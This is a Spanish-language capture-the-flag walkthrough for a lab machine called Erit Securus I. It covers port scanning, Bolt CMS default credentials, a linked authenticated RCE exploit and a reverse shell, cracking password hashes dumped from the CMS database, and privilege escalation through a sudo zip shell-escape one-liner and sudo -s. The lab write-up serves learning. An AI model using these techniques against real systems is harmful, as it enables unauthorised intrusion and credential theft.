# Erit Securus I
## Initial Scan
```
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey: 
|   1024 b1:ac:a9:92:d3:2a:69:91:68:b4:6a:ac:45:43:fb:ed (DSA)
|   2048 3a:3f:9f:59:29:c8:20:d7:3a:c5:04:aa:82:36:68:3f (RSA)
|   256 f9:2f:bb:e3:ab:95:ee:9e:78:7c:91:18:7d:95:84:ab (ECDSA)
|_  256 49:0e:6f:cb:ec:6c:a5:97:67:cc:3c:31:ad:94:a4:54 (ED25519)
80/tcp open  http    nginx 1.6.2
|_http-generator: Bolt
|_http-server-header: nginx/1.6.2
|_http-title: Graece donan, Latine voluptatem vocant. | Erit Securus 1
```
## Enum 
### HTTP
Con wappalyzer podemos ver que tenemos un Bolt CMS el cual tiene varias vulns conocidas:
```
Bolt CMS 3.6.10 - Cross-Site Request Forgery                                                                     | php/webapps/47501.txt
Bolt CMS 3.6.4 - Cross-Site Scripting                                                                            | php/webapps/46495.txt
Bolt CMS 3.6.6 - Cross-Site Request Forgery / Remote Code Execution                                              | php/webapps/46664.html
Bolt CMS 3.7.0 - Authenticated Remote Code Execution                                                             | php/webapps/48296.py
Bolt CMS < 3.6.2 - Cross-Site Scripting                                                                          | php/webapps/46014.txt
```
No tenemos creds pero admin:pasword funcionan perfectamente en el endpoint de administración, gracias a ello sabemos que la versión es la 3.7, probemos esta version del script para la 3.7 (la de exploitdb no va bien)
```
https://raw.githubusercontent.com/r3m0t3nu11/Boltcms-Auth-rce-py/master/exploit.py
```
El handler del exploit falla mas que una escopeta de feria pero te sube una reverse shell usable en cada uno de los test, que podemos usar sin el propio script, una vez tenemos un test vamos a el mismo y obtenemos mediante la ejecucion de wget una reverse shell completa.

## Privesc
### Willec 
Enumerando encontramos la base de datos de bolt manejamos esa mediante sqlite y hacemos la siguiente querry:
```
1|admin|$2y$10$lFIIlzYOrJMHbLZB.kVS2eF4Iezyrt/FfyZqDd0ZukJ7IGKtLUf16||0|a@a.com|2020-09-14 01:10:52|192.168.100.1|[]|1|||||["root","everyone"]
2|wildone|$2y$10$ZZqbTKKlgDnCMvGD2M0SxeTS3GPSCljXWtd172lI2zj3p6bjOCGq.|Wile E Coyote|0|wild@one.com|2020-04-25 16:03:44|192.168.100.1|[]|1|||||["editor"]
```
Si crackeamos la pass de wildone es snickers, esta pass es valida para el usuario wileec en la máquina , podemos hacer su a este y usar su clave ssh para conectarnos a la IP que tenemos de la db
### jsmith
```
User wileec may run the following commands on Securus:
    (jsmith) NOPASSWD: /usr/bin/zip
```
Ejecutamos lo siguiente:
```
TF=$(mktemp -u)
sudo -u jsmith zip $TF /etc/hosts -T -TT 'sh #'
```
Y ya tenemos shell como jsmith
### Root
```
User jsmith may run the following commands on Securus:
    (ALL : ALL) NOPASSWD: ALL
```
Ejecutamos esto:
```
sudo -s
```
Y ya tenemos shell como root
